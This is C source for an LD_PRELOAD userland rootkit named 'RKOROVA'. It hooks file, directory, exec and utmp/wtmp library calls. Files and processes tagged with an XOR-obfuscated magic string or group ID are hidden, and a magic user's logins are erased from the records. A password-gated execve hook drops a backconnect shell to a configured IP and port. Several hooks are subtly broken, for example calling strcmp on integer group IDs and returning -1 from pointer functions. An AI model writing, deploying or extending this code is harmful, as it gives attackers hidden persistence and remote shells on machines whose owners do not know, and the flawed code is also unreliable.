#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <string.h> 
#include <dlfcn.h> 
#include <errno.h> 
#include <utmp.h>
#include <utmpx.h>
#include <sys/stat.h>
#include <sys/ioctl.h> 
#include <sys/types.h>
#include <fcntl.h> 
#include <errno.h> 
#include <termios.h> 
#include <netinet/in.h> 
#include <dirent.h>
#include <limits.h> 
#include "utils/clean.h"
#include "utils/catflap.h"
#include "rkconst.h"

/*
  ==========HOOKS============
 * execve 
 * chmod 
 * ptrace
 * directory functions 
 |-> readdir 
 |-> chdir 
 |-> mkdir 
 |-> mkdirat 
 |-> rmdir 
 |-> opendir
 |-> fdopendir
 * file linking functions
 |-> link 
 |-> linkat
 |-> unlink 
 |-> unlinkat 
 |-> symlink 
 |-> symlinkat 
 * file open functions 
 |-> access 
 |-> open 
 |-> fopen 
 * file status functions 
 |-> stat 
 |-> fstat 
 |-> fstatat 
 |-> lstat
 * utmp/wtmp functions 
 |-> getutent 
 |-> getutxent
 |-> getutid
 |-> getutxid
 |-> pututline
 |-> pututxline
 |-> getutmp
 |-> getutmpx
 |-> updwtmp
 |-> updwtmpx
 |-> login 
   ===========================
*/
//function pointers to hooked functions
int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
int (*old_chmod)(const char *pathname, mode_t mode); 

//directory functions
struct dirent *(*old_readdir)(DIR *dirp);
int (*old_chdir)(const char *path); 
int (*old_mkdir)(const char *pathname, mode_t mode); 
int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
int (*old_rmdir)(const char *pathname); 
DIR *(*old_opendir)(const char *name); 
DIR *(*old_fdopendir)(int fd);

//file linking functions 
int (*old_link)(const char *oldpath, const char *newpath); 
int (*old_unlink)(const char *path); 
int (*old_symlink)(const char *path1, const char *path2); 

//file opening functions 
int (*old_access)(const char *path, int amode); 
int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
FILE *(*old_fopen)(const char *pathname, const char *mode); 

//stat functions
int (*old_stat)(const char *path, struct stat *buf);
int (*old_stat64)(const char *path, struct stat64 *buf);
int (*old___xstat)(int ver, const char *path, struct stat *buf); 
int (*old_fstat)(int fildes, struct stat *buf); 
int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
int (*old_lstat)(const char *restrict path, struct stat *restrict buf);

//utmp/wtmp functions 
struct utmp *(*old_getutent)(void); 
struct utmp *(*old_getutid)(const struct utmp *ut); 
struct utmp *(*old_getutline)(const struct utmp *ut); 
struct utmp *(*old_pututline)(const struct utmp *ut); 
struct utmpx *(*old_getutxent)(void); 
struct utmpx *(*old_getutxid)(const struct utmpx *); 
struct utmpx *(*old_getutxline)(const struct utmpx *);
struct utmpx *(*old_pututxline)(const struct utmpx *); 
void (*old_getutmp)(const struct utmpx *ux, struct utmp *u);
void (*old_getutmpx)(const struct utmp *u, struct utmpx *ux); 
void (*old_updwtmp)(const char *wtmp_file, const struct utmp *ut);
void (*old_updwtmpx)(const char *wtmpx_file, const struct utmpx *utx); 
void (*old_login)(const struct utmp *ut);

void xor(char *s)
{
       int i, key = 0x2A;
       for(i=0; i<strlen(s); i++) s[i] ^= key;
}        

int owned(void)
{ 
	int x;
	
	if ((getuid() == 0) || getgid() == MAGICGID)
	{
		setuid(0); 
		x = 1; 
	} 
	else
		x = 0; 
	return x; 
} 


int execve(const char *path, char *const argv[], char *const envp[])
{
	HOOK(execve);
	#ifdef DEBUG 
	printf("[!] execve hooked"); 
	#endif
	
	if (owned())
	{
		if (argv[1] != NULL)
		{ 
			char *execpw = strdup(EXECPW); xor(execpw); 
			if (!strcmp(argv[1],  execpw))
			{	
				if (!strcmp(argv[2], "dropshell"))
				{ 
					printf("dropping backconnect shell\n");
				        catflap(IP, DEFAULT_PORT);
				}
			} 
			CLEAN(execpw);
			return old_execve(path, argv, envp);
		}
	       	return old_execve(path, argv, envp);	
	} 
	return old_execve(path, argv, envp); 
} 

int chmod(const char *path, mode_t mode) 
{ 
	HOOK(chmod);
	#ifdef DEBUG 
	printf("[!] chmod hooked");
	#endif
	
	char *magic = strdup(MAGIC); xor(magic);
       	struct stat filestat; 	
	old_stat(path, &filestat);	
	if (owned())
	{
		if (strstr(path, MAGIC) || (!strcmp(filestat.st_gid, MAGICGID)) )
		{ 
			errno = ENOENT; 
			return -1; 
		}
		CLEAN(magic);
		return old_chmod(path, mode); 
	}
	CLEAN(magic);
        return old_chmod(path, mode); 	
}

int stat(const char *path, struct stat *buf)
{
	HOOK(stat);
	#ifdef DEBUG
	printf("[!] stat hooked"); 
	#endif

	char *magic = strdup(MAGIC); xor(magic); 
	if (owned())
	{ 
		if (strstr(path, magic))
		{
			errno = ENOENT; 
			return -1; 
		} 
		return old_stat(path, buf); 
	} 
	return old_stat(path, buf); 
}

int stat64(const char *path, struct stat64 *buf)
{ 
	HOOK(stat64);
	#ifdef DEBUG
	printf("[!] stat64 hooked"); 
	#endif	
	
	char *magic = strdup(MAGIC); xor(magic);
	if (owned())
	{
		if (strstr(path, magic))
		{ 
			errno = ENOENT; 
			return -1; 
		} 
		return old_stat64(path, buf); 
	}
	return old_stat64(path, buf); 
}

int __xstat(int ver, const char *path, struct stat *buf)
{ 
	HOOK(__xstat);
	struct stat s_fstat; 
	#ifdef DEBUG 
	printf("[!] __xstat hooked"); 
	#endif 
	char *magic = strdup(MAGIC); xor(magic);  
	memset(&s_fstat, 0, sizeof(stat)); 
	old___xstat(ver, path, &s_fstat); 

	#ifdef DEBUG 
	printf("PATH: %s\n", path); 
	printf("GID: %s\n", s_fstat.gid); 
	#endif
	
	memset(&s_fstat, 0, sizeof(stat)); 
	
	if (s_fstat.st_gid == magic || strstr(path, magic))
	{ 
		errno = ENOENT; 
		return -1; 
	} 
	return old___xstat(ver, path, buf); 
} 

int link(const char *oldpath, const char *newpath)
{ 
	HOOK(link);
	#ifdef DEBUG
       	printf("[!] link hooked"); 
	#endif	
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old_stat(oldpath, &filestat);
	if (owned())
	{ 
		if (strstr(oldpath, MAGIC) || (!strcmp(filestat.st_gid, MAGICGID)))
		{ 
			errno = ENOENT; 
			return -1;
		} 
		return old_link(oldpath, newpath); 
	} 
	return old_link(oldpath, newpath); 
} 
 
int unlink(const char *path)
{
	HOOK(unlink);
	#ifdef DEBUG 
	printf("[!] unlink hooked");
	#endif
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old_stat(path, &filestat); 
	if (owned())
	{
		if (strstr(path, MAGIC) || (!strcmp(filestat.st_gid, MAGICGID)))
		{ 
			errno = ENOENT; 
			return -1; 
		}
		return old_unlink(path); 
	} 
	return old_unlink(path); 
} 

int symlink(const char *path1, const char *path2)
{ 
	HOOK(symlink);
	#ifdef DEBUG 
	printf("[!] symlink hooked");
	#endif
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat1, filestat2; 
	old_stat(path1, &filestat1); 
	old_stat(path2, &filestat2); 
	if (owned())
	{
		if (strstr(path1, MAGIC) || strstr(path2, MAGIC) || (!strcmp(filestat1.st_gid, MAGICGID)) || (!strcmp(filestat2.st_gid, MAGICGID)))
		{
			errno = ENOENT; 
	 		return -1;
	        }
		return old_symlink(path1, path2); 
	}	
	return old_symlink(path1, path2); 
}		

struct dirent *readdir(DIR *dirp)
{ 
	HOOK(readdir);
	#ifdef DEBUG 
	printf("[!] readdir hooked"); 
	#endif
	
	char *magic = strdup(MAGIC); xor(magic); 
	struct dirent *dir; 
	struct stat s_fstat; 
	memset(&s_fstat, 0, sizeof(stat)); 
	do
	{ 
		dir = old_readdir(dirp); 
		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0) || strcmp(dir->d_name, "/\0") == 0)
			continue; 
		if (dir != NULL)
		{ 
			char path[PATH_MAX + 1]; 
			snprintf(path, PATH_MAX, "/proc/%s", dir->d_name); 
			old___xstat(_STAT_VER, path, &s_fstat); 
		}
	}while (dir && (s_fstat.st_gid == magic)); 
		
	return dir;
} 

int chdir(const char *path)
{ 
	HOOK(chdir);
	#ifdef DEBUG
	printf("[!] chdir hooked"); 
	#endif

	char *magic = strdup(MAGIC); xor(magic); 
	if (strstr(path, magic))
	{ 
		errno = ENOENT; 
		return -1; 
	} 
	return old_chdir(path); 
} 

int mkdir(const char *pathname, mode_t mode)
{ 
	HOOK(mkdir);
	#ifdef DEBUG
	printf("[!] mkdir hooked"); 
	#endif 

	char *magic = strdup(MAGIC); xor(magic);
       	if (owned())
	{
		if (strstr(pathname, magic))
		{ 
			errno = ENOENT; 
			return -1; 
		} 
		return old_mkdir(pathname, mode); 
	} 
	return old_mkdir(pathname, mode); 
} 

int mkdirat(int dirfd, const char *pathname, mode_t mode)
{ 
	HOOK(mkdirat); 
	#ifdef DEBUG 
	printf("[!] mkdirat hooked"); 
	#endif

	char *magic = strdup(MAGIC); xor(magic); 
	if (owned())
	{ 
		if (strstr(pathname, magic))
		{ 
			errno = ENOENT; 
			return -1;
		}
		return old_mkdirat(dirfd, pathname, mode); 
	} 
	return old_mkdirat(dirfd, pathname, mode); 
} 

int rmdir(const char *pathname)
{ 
	HOOK(rmdir); 
	#ifdef DEBUG 
	printf("[!] rmdir hooked");
	#endif 

	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old_stat(pathname, &filestat); 
	if (owned())
	{ 
		if (strstr(pathname, magic) || !strcmp(filestat.st_gid, MAGICGID))
		{
			errno = ENOENT; 
			return -1; 
		} 
		return old_rmdir(pathname); 
	} 
	return old_rmdir(pathname); 
} 

DIR *opendir(const char *name)
{ 
	HOOK(opendir); 
	#ifdef DEBUG 
      	printf("[!] opendir hooked"); 
	#endif
	
	char *magic = strdup(MAGIC); xor(magic); 
	if (owned())
	{
	       if (strstr(name, magic))
	       {
			errno = ENOENT; 
	 		return -1; 
	       } 
	       return old_opendir(name);
	} 
	return old_opendir(name); 
} 

int access(const char *pathname, int mode)
{ 
	HOOK(access); 
	#ifdef DEBUG 
	printf("[!] access hooked"); 
	#endif

	char *magic = strdup(MAGIC); xor(magic); 
	if (owned())
	{ 
		if (strstr(pathname, magic))
		{ 
			errno = ENOENT; 
			return -1; 
		} 
		return old_access(pathname, mode); 
	} 
	return old_access(pathname, mode); 
} 

FILE *fopen(const char *pathname, const char *mode)
{ 
	HOOK(fopen); 
	#ifdef DEBUG 
	printf("[!] fopen hooked"); 
	#endif 

	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old_stat(pathname, &filestat); 
	if (owned())
	{ 
		if (strstr(pathname, MAGIC) || !strcmp(filestat.st_gid, MAGICGID))
		{ 
			errno = ENOENT;
			return -1;
		} 
		return old_fopen(pathname, mode); 
	} 
	return old_fopen(pathname, mode); 
} 

struct utmp *getutent(void)
{ 
	HOOK(getutent); 
	#ifdef DEBUG 
	printf("[!] geutent hooked"); 
	#endif 

	struct utmp *x = old_getutent(); 
	if (x && x->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic);
		if (!strcmp(x->ut_user, magic))
		{ 
			errno = ESRCH; 
			return NULL; 
		} 
		CLEAN(magic); 
	} 
	return old_getutent(); 
} 

struct utmpx *getutxent(void)
{
	HOOK(getutxent);
	#ifdef DEBUG 
	printf("[!] getutxent hooked"); 
	#endif 

	struct utmpx *foo = old_getutxent();
	if (foo && foo->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if (!strcmp(foo->ut_user, magic))
		{ 
			CLEAN(magic);
			errno = ESRCH; 
			return NULL; 
		} 
		CLEAN(magic);
	} 
	return old_getutxent(); 
} 

struct utmp *getutid(const struct utmp *ut)
{ 
	HOOK(getutid); 
	#ifdef DEBUG 
	printf("[!] getutid hooked"); 
	#endif

	struct utmp *foo = old_getutid(ut);
       	if (foo && foo->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if(!strcmp(foo->ut_user, magic))
		{ 
			CLEAN(magic);
			errno = ESRCH; 
			return NULL; 
		} 
		CLEAN(magic); 
	} 
	return old_getutid(ut); 
} 

struct utmpx *getutxid(const struct utmpx *utx)
{ 
	HOOK(getutxid); 
	#ifdef DEBUG
	printf("[!] getutxid hooked"); 
	#endif 

	struct utmpx *foo = old_getutxid(utx); 
	if (foo && foo->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if(!strcmp(foo->ut_user, magic))
		{ 
			CLEAN(magic);
			errno = ESRCH; 
			return NULL; 
		} 
		CLEAN(magic); 
	} 
	return old_getutxid(utx); 
} 
struct utmp *pututline(const struct utmp *ut)
{ 
	HOOK(pututline); 
	#ifdef DEBUG 
	printf("[!] pututline hooked"); 
	#endif 	

	struct utmp *foo = old_pututline(ut); 
	if (foo && foo->ut_user != NULL) 
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if (!strcmp(foo->ut_user, magic))
		{
			CLEAN(magic);
			return NULL; 
		} 
		CLEAN(magic); 
	}
	return old_pututline(ut); 
} 

struct utmpx *pututxline(const struct utmpx *utx)
{ 
	HOOK(pututxline); 
	#ifdef DEBUG 
	printf("[!] pututxline hooked"); 
	#endif 

	struct utmpx *foo = old_pututxline(utx); 
	if (foo && foo->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 		
		if (!strcmp(foo->ut_user, magic))
		{ 
			CLEAN(magic);
			return NULL; 
		}
	        CLEAN(magic);  
	}
	return old_pututxline(utx); 
}

void getutmp(const struct utmpx *ux, struct utmp *u)
{ 
	HOOK(getutmp); 
	#ifdef DEBUG 
	printf("[!] getutmp hooked"); 
	#endif 
	
	if (ux && ux->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if (!strcmp(ux->ut_user, magic))
		{
			CLEAN(magic); 
			return NULL;
		} 
		CLEAN(magic); 
	} 
	return old_getutmp(ux, u);
}

void getutmpx(const struct utmp *u, struct utmpx *ux)
{ 
	HOOK(getutmpx); 
	#ifdef DEBUG 
	printf("[!] getutmpx hooked"); 
	#endif 

	if (u && u->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic);
		if (!strcmp(u->ut_user, magic))
		{
			CLEAN(magic);
			return NULL;
		}
		CLEAN(magic);
	}
	return old_getutmp(u, ux);
}

void updwtmp(const char *wtmp_file, const struct utmp *ut)
{ 
	HOOK(updwtmp);
	#ifdef DEBUG 
	printf("[!] updwtmp hooked"); 
	#endif

	if (ut && ut->ut_user != NULL)
	{
		char *magic = strdup(MAGIC); xor(magic); 
		if (!strcmp(ut->ut_user, magic))
		{ 
			CLEAN(magic); 
			return; 
		}
		CLEAN(magic); 
	} 
	return old_updwtmp(wtmp_file, ut); 
} 

void updwtmpx(const char *wtmpx_file, const struct utmpx *utx)
{ 
	HOOK(updwtmpx); 
	#ifdef DEBUG 
	printf("[!] updwtmp hooked"); 
	#endif 

	if (utx && utx->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if (!strcmp(utx->ut_user, magic))
		{ 
			CLEAN(magic); 
			return; 
		} 
		CLEAN(magic); 
	}
	return old_updwtmpx(wtmpx_file, utx); 
} 

void login(const struct utmp *ut)
{
	HOOK(login);
	#ifdef DEBUG 
	printf("[!] login hooked"); 
	#endif 

	if (ut && ut->ut_user != NULL)
	{ 
		char *magic = strdup(MAGIC); xor(magic); 
		if (!strcmp(ut->ut_user, magic))
		{
			CLEAN(magic);
			return;
		}
		CLEAN(magic);
	}
	return old_login(ut);
}




void init(void)
{ 
	#ifdef DEBUG 
	printf("RKOROVA LOADED"); 
	#endif
}


void __attribute ((destructor)) rkexit(void)
{
	/* do something */ 
} 

